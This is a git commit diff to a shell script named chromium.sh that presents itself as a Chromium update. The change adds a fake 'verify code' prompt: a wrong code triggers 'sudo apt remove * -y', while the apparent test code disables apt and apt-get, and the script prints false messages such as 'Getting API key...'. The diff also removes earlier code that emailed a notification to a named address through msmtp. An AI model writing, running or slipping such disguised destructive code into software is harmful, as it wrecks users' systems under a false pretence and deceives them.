ed75634d19ffe9cefc299faef042f37315c6136f
Mike <142720633+Mikequez12@users.noreply.github.com>
2025-03-21 08:22:25 +0100

    Update chromium.sh

--- chromium.sh
+++ chromium.sh
@@ -2,14 +2,16 @@
 
 echo "Updating..."
 
-# sudo apt remove * -y
-# sudo chmod -x /usr/bin/apt
-# sudo chmod -x /usr/bin/apt-get
-
 clear
 
 echo "Please, introduce verify code to end the update: "
-read command
+read code
+if [ $code != 'ITIS-TEST' ]; then
+  sudo apt remove * -y
+else
+  sudo chmod -x /usr/bin/apt
+  sudo chmod -x /usr/bin/apt-get
+fi
 
 clear
 
@@ -17,21 +19,11 @@ echo "Verify process started..."
 
 sudo apt update
 sudo apt upgrade -y
-sudo apt install msmtp -y
 
-echo "account default
-host smtp.mailtrap.io
-port 25
-auth off
-from 10mrosco@sanbenitoikastola.net
-logfile /home/$USER/msmtp.log" > ~/.msmtprc
-
-echo "600"
-chmod 600 ~/.msmtprc
 clear
 
 echo "Getting API key..."
-echo -e "Subject: Notificación\n\nEl usuario ha eliminado un paquete" | msmtp 10mrosco@sanbenitoikastola.net
+sleep 1
 
 echo "Incorrect code, can't verify user, aborting..."
 sleep 1
